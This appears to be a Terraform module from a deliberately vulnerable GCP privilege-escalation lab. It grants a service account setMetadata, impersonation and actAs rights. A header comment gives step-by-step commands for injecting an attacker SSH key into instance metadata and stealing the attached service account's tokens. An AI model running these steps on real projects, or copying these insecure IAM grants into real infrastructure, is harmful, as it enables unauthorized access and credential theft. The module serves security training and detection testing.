# Privesc Path 11b: Set Instance Metadata via Manual Key Injection
#
# VULNERABILITY: A service account with compute.instances.setMetadata can manually
# generate SSH keys and inject them into instance metadata using add-metadata.
#
# EXPLOITATION:
#   1. Impersonate the attacking service account
#   2. Find instances with high-priv service accounts attached
#   3. Generate SSH key: ssh-keygen -t rsa -f /tmp/evil-key -N ""
#   4. Inject key: gcloud compute instances add-metadata INSTANCE \
#        --metadata="ssh-keys=attacker:$(cat /tmp/evil-key.pub)"
#   5. SSH directly: ssh -i /tmp/evil-key attacker@INSTANCE_IP
#   6. Access the metadata server to get tokens for the attached SA
#
# DETECTION: FoxMapper detects this via the setMetadata edge checker
#
# REAL-WORLD IMPACT: Critical - SSH access to compute instances
#
# NOTE: This uses the same permission as 11a but demonstrates explicit key
# injection rather than relying on gcloud's automatic key management.
#
# DISABLED BY DEFAULT: Requires enable_privesc11b = true (creates target VM ~$2-5/mo)

resource "google_service_account" "privesc11b_set_metadata" {
  count = var.enable_privesc11b ? 1 : 0

  account_id   = "${var.resource_prefix}11b-set-metadata"
  display_name = "Privesc11b - setMetadata (manual)"
  description  = "Can escalate via manual SSH key injection into metadata"
  project      = var.project_id

  depends_on = [time_sleep.batch4_delay]
}

# Custom role with setMetadata permission
resource "google_project_iam_custom_role" "privesc11b_set_metadata" {
  count = var.enable_privesc11b ? 1 : 0

  role_id     = "${var.resource_prefix}_11b_setMetadata"
  title       = "Privesc11b - Set Instance Metadata (manual)"
  description = "Vulnerable: Can manually inject SSH keys into instance metadata"
  permissions = [
    "compute.instances.list",
    "compute.instances.get",
    "compute.instances.setMetadata",
    "compute.projects.get",
    "compute.zones.list",
  ]
  project = var.project_id
}

# Assign the vulnerable role
resource "google_project_iam_member" "privesc11b_role" {
  count = var.enable_privesc11b ? 1 : 0

  project = var.project_id
  role    = google_project_iam_custom_role.privesc11b_set_metadata[0].id
  member  = "serviceAccount:${google_service_account.privesc11b_set_metadata[0].email}"
}

# Allow the attacker to impersonate this service account
resource "google_service_account_iam_member" "privesc11b_impersonate" {
  count = var.enable_privesc11b ? 1 : 0

  service_account_id = google_service_account.privesc11b_set_metadata[0].name
  role               = "roles/iam.serviceAccountTokenCreator"
  member             = var.attacker_member
}

# Grant actAs on high-priv SA (required for gcloud to modify instance metadata)
resource "google_service_account_iam_member" "privesc11b_actas_high_priv" {
  count = var.enable_privesc11b ? 1 : 0

  service_account_id = google_service_account.high_priv.name
  role               = "roles/iam.serviceAccountUser"
  member             = "serviceAccount:${google_service_account.privesc11b_set_metadata[0].email}"
}
